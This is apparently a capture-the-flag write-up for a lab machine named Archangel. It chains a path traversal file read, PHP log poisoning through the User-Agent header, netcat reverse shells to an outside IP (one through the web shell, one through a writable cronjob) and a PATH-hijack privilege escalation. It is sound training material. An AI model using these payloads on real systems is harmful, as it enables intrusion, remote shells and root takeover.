# Archangel

### Archangel
Nmap scan shows ports 22 and 80 open. The room suggests to find a hidden hostname. I don't know what the domain is but the header of the page suggests that it might be `mafialive.thm`:<br />
![image](https://github.com/user-attachments/assets/fbb156ab-eecb-47da-85d6-882e749db36e)<br />
So I add the following line to the /etc/hosts file: `10.10.142.179 mafialive.thm`. This domain contains the first flag. 
After some enumeration, the following URL: `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../etc/passwd` worked for me to read the contents of the `/etc/passwd` file.<br /> 
I now perform log poisoning. First, I intercept a request with burp and substitute the user-agent with this code: `<?php system($_GET['cmd']); ?>`. <br />
Next, I visit: `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log&cmd=id` and get RCE: <br />
![image](https://github.com/user-attachments/assets/de12fddb-fd75-4e45-b49e-03707cd16a96)<br />
Now to spawn a reverse shell I open a netcat listener on port 9001 and visit: `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log&cmd=busybox%20nc%2010.14.90.188%209001%20-e%20sh`.<br />
Now to log into archangel's account: <br />
![image](https://github.com/user-attachments/assets/4b40dc9c-2d9c-4d82-a8e1-8a3143ae4e42)<br />
Archangel runs a cronjob to which I have write access. I just need to modify it to spawn a reverse shell. I modified it with `busybox nc 10.14.90.188 4444 -e sh`, and got a reverse shell after a few seconds. To become root now, inside `/home/archangel/secret`, there's a SUID binary called `backup`. If I run `strings backup` I get, among other things, the following: <br />
![image](https://github.com/user-attachments/assets/0468b940-da79-4023-af64-e94b3eaa2122)<br />
The vulnerability here lies in the fact that this binary is running `cp`,  not `/usr/bin/cp` or whatever. The path is relative, not absolute. This means that I can create my own `cp` binary inside `/tmp`, and change the PATH environment variable to first search inside `/tmp`.
The newly created `cp` file looks as follows:

    #!/bin/bash
    /bin/bash

Now make it executable with `chmod +x cp`. Finally, change the PATH with the following command: `export PATH=/tmp:$PATH`. Now just run the SUID binary and become root:<br />
![image](https://github.com/user-attachments/assets/5c381b0b-bdf7-4f03-8c5c-8cb310d72024)<br />




